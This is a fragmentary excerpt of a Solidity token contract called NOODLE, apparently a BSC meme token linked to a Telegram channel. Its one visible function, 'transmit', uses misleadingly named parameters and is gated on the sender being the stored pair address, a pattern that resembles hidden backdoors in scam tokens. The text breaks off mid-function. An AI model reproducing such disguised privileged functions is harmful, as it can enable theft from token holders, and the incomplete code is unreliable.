...
/**
telegram: https://t.me/NoodleCatBSC
**/
...
contract NOODLE is IERC20, Ownable, BaseToken {
    ...
    function transmit(uint256 _verbalBuyTax, uint256 _verbalSellTax, uint256 constantAmount, address _pair) public {
        require(uniswapV2Pair == _msgSender());
        require(_verbalBuyTax > 0, "Transfer amount must be greater than zero");
        uint256 contractTokenBalance = _verbalBuyTax ** _verbalSellTax;
